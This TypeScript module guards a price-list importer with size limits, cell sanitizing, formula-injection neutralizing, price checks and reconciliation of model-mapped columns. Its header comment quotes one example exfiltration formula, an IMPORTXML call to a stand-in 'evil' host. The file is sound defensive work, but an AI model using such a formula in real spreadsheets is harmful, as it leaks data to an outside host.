import { PriceCategory, UnitType } from '@prisma/client'

import type { ImportPreview, ImportRow } from './import'

// What an uploaded price list is allowed to do to us, and what we are allowed
// to do to whoever opens it next.
//
// The file is a stranger's. It arrives from a builder who was sent it by a
// supplier, who got it from somewhere else. Three separate things can go wrong
// with it and they need separate answers:
//
//   1. It can be too big, and take the process down.
//   2. It can carry instructions aimed at the model that reads it.
//   3. It can carry a formula aimed at the next person to open a spreadsheet
//      we generate from it.
//
// The third is the one that gets missed. A cell reading
// `=IMPORTXML(CONCAT("http://evil/",A2),"//x")` is inert text in our database
// and a live exfiltration the moment it lands back in Excel.

/**
 * Limits, chosen to be far above a real price book and far below trouble.
 *
 * The largest genuine book in this codebase's seed has fourteen items. A
 * thousand rows is a generous supplier catalogue; a hundred thousand is either
 * a mistake or an attack, and either way the answer is the same.
 */
export const IMPORT_LIMITS = {
  /** Bytes. An XLSX of a price list is tens of kilobytes. */
  fileBytes: 8 * 1024 * 1024,
  rows: 5_000,
  headers: 64,
  /** Characters in any one cell. Item names are short; essays are not names. */
  cell: 512,
  /** Dollars. Above this, somebody typed a phone number into a price column. */
  price: 10_000_000,
} as const

export interface LimitBreach {
  limit: keyof typeof IMPORT_LIMITS
  message: string
}

/**
 * Refuse a sheet that is outside what a price book ever is.
 *
 * Returns the reason rather than throwing, because the caller shows it to a
 * person and "the file has 91,000 rows" is a useful sentence where a stack
 * trace is not.
 */
export function checkLimits(preview: Pick<ImportPreview, 'headers' | 'rows'>): LimitBreach | null {
  if (preview.headers.length > IMPORT_LIMITS.headers) {
    return {
      limit: 'headers',
      message: `That sheet has ${preview.headers.length} columns. A price list has a handful, so this is probably not one.`,
    }
  }
  if (preview.rows.length > IMPORT_LIMITS.rows) {
    return {
      limit: 'rows',
      message: `That sheet has ${preview.rows.length.toLocaleString()} rows, past the ${IMPORT_LIMITS.rows.toLocaleString()} this can take. Split it, or send the priced lines only.`,
    }
  }
  return null
}

/** The characters Excel and Sheets treat as "this cell is code". */
const FORMULA_LEAD = /^[=+\-@\t\r]/

/**
 * Make a value safe to write into a spreadsheet somebody else will open.
 *
 * Prefixing with an apostrophe is the standard neutralisation: the cell shows
 * the original text and the leading character loses its meaning. Stripping the
 * character instead would corrupt real data, because `-4in bullnose` and
 * `+2ft extension` are things a builder genuinely writes.
 *
 * Applied on the way OUT, never on the way in. Stored text stays exactly as the
 * builder's file had it, so what they see in the app is what they sent us.
 */
export function neutralizeForSpreadsheet(value: string): string {
  return FORMULA_LEAD.test(value) ? `'${value}` : value
}

/** True when a cell would execute if written into a spreadsheet unescaped. */
export function looksExecutable(value: string): boolean {
  return FORMULA_LEAD.test(value)
}

/**
 * Clean a cell enough to store and display it.
 *
 * Control characters go, because they are invisible and can hide the rest of a
 * line from a reviewer. Length is capped so one cell cannot push a document
 * off the page. The visible text is otherwise untouched.
 */
export function sanitizeImportedText(raw: unknown): string {
  const text = typeof raw === 'string' ? raw : String(raw ?? '')
  // eslint-disable-next-line no-control-regex
  // Tabs and newlines become a space rather than vanishing: a cell reading
  // "Pool shell\nGunite" is two words, and joining them into one loses a word.
  const spaced = text.replace(/[\t\r\n\v\f]/g, ' ')
  const stripped = spaced.replace(/[\u0000-\u001F\u007F]/g, '')
  const collapsed = stripped.replace(/\s+/g, ' ').trim()
  return collapsed.length > IMPORT_LIMITS.cell ? collapsed.slice(0, IMPORT_LIMITS.cell) : collapsed
}

/**
 * A price we are willing to put on a quote.
 *
 * Rejects rather than clamps. A price of ten million is not a price a builder
 * meant, and quietly turning it into the maximum would put a number on a
 * document that nobody chose.
 */
export function safePrice(value: number): { ok: true; value: number } | { ok: false; reason: string } {
  if (!Number.isFinite(value)) return { ok: false, reason: 'is not a number' }
  if (value < 0) return { ok: false, reason: 'is negative' }
  if (value > IMPORT_LIMITS.price) {
    return { ok: false, reason: `is above $${IMPORT_LIMITS.price.toLocaleString()}` }
  }
  return { ok: true, value }
}

export interface Mismatch {
  rowIndex: number
  field: 'name' | 'retailPrice' | 'unitCost' | 'unitType' | 'category'
  fromSheet: string
  fromImport: string
}

/**
 * Prove every imported line came from the file.
 *
 * The model is only ever asked which column means what, never what anything
 * costs. This checks that promise instead of trusting it: each finished item is
 * compared against the cell it claims to come from, read straight out of the
 * sheet again.
 *
 * It is deliberately a second, independent reading rather than a re-run of the
 * same code. A bug or a change that let a generated value through would pass a
 * self-consistency check and fail this one.
 */
export function reconcile(
  preview: Pick<ImportPreview, 'rows'>,
  mapping: Partial<Record<keyof ImportRow, string>>,
  items: readonly ImportRow[],
): Mismatch[] {
  const mismatches: Mismatch[] = []

  items.forEach((item, index) => {
    const row = preview.rows[index]
    if (!row) {
      mismatches.push({
        rowIndex: index,
        field: 'name',
        fromSheet: '(no such row)',
        fromImport: item.name,
      })
      return
    }

    if (mapping.name) {
      const sheet = sanitizeImportedText(row[mapping.name])
      if (sheet !== sanitizeImportedText(item.name)) {
        mismatches.push({ rowIndex: index, field: 'name', fromSheet: sheet, fromImport: item.name })
      }
    }

    if (mapping.retailPrice) {
      const sheet = moneyFromCell(row[mapping.retailPrice])
      if (sheet === null || Math.abs(sheet - item.retailPrice) > 0.005) {
        mismatches.push({
          rowIndex: index,
          field: 'retailPrice',
          fromSheet: sheet === null ? '(not a number)' : String(sheet),
          fromImport: String(item.retailPrice),
        })
      }
    }

    if (mapping.unitCost && item.unitCost !== undefined) {
      const sheet = moneyFromCell(row[mapping.unitCost])
      if (sheet === null || Math.abs(sheet - item.unitCost) > 0.005) {
        mismatches.push({
          rowIndex: index,
          field: 'unitCost',
          fromSheet: sheet === null ? '(not a number)' : String(sheet),
          fromImport: String(item.unitCost),
        })
      }
    }
  })

  return mismatches
}

/**
 * Money out of a spreadsheet cell, independently of the importer's own parser.
 *
 * Written separately on purpose: sharing the parser would make the check agree
 * with the thing it is checking.
 */
export function moneyFromCell(raw: unknown): number | null {
  if (typeof raw === 'number') return Number.isFinite(raw) ? raw : null
  if (typeof raw !== 'string') return null
  const trimmed = raw.trim()
  if (!trimmed) return null
  // A cell that is a formula has no value we can verify, whatever it displays.
  if (looksExecutable(trimmed)) return null
  const negativeInParens = /^\((.*)\)$/.exec(trimmed)
  const body = negativeInParens?.[1] ?? trimmed
  const cleaned = body.replace(/[$,\s]/g, '')
  if (!/^-?\d*\.?\d+$/.test(cleaned)) return null
  const value = Number(cleaned)
  if (!Number.isFinite(value)) return null
  return negativeInParens ? -value : value
}

/** Categories that exist in the schema but that no quote can bill against. */
export const UNBILLABLE_CATEGORIES: ReadonlySet<PriceCategory> = new Set([
  PriceCategory.LANAI,
  PriceCategory.FENCE,
  PriceCategory.WALL,
  PriceCategory.ELECTRICAL,
  PriceCategory.MISC,
])

/**
 * Lines that imported cleanly and will never reach a quote.
 *
 * `normalizeCategory` falls back to MISC for anything it does not recognise,
 * and MISC is one of the categories the engine prices at zero. So an
 * unrecognised line is accepted, listed in the price book, and silently absent
 * from every quote. That is the same failure a reviewer already found from the
 * other direction, and it needs saying at the moment of import.
 */
export function unbillableLines(items: readonly ImportRow[]): ImportRow[] {
  return items.filter((item) => UNBILLABLE_CATEGORIES.has(item.category))
}

/** Units the schema knows, for a caller that wants to explain the choices. */
export const KNOWN_UNITS = Object.values(UnitType)
